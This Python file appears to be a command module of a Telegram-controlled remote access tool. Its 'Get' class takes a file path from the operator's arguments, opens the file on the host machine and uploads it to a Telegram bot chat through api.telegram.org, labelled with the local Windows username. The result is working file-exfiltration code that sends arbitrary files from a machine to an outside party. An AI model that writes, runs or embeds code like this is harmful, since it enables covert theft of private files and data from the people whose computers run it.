import os
import requests
class Get():
	def __init__(self, _):
		self.token = _.token
		self.chat_id = _.chat_id
		self.filename = " ".join(_.args)
		self._ = _
		self.Main()

	def Main(self):
		if os.path.exists(self.filename):
			requests.get('https://api.telegram.org/bot' + self.token + '/sendDocument?chat_id=' + self.chat_id, files = {'document' : open(self.filename,'rb'), 'Caption' : os.environ['Username']})
			result = "%E2%9C%94%EF%B8%8F File Send Succeed."
			self._.Send_Message(result)
		else:
			result = "%E2%9C%96%EF%B8%8F File Not Exists."
			self._.Send_Message(result)
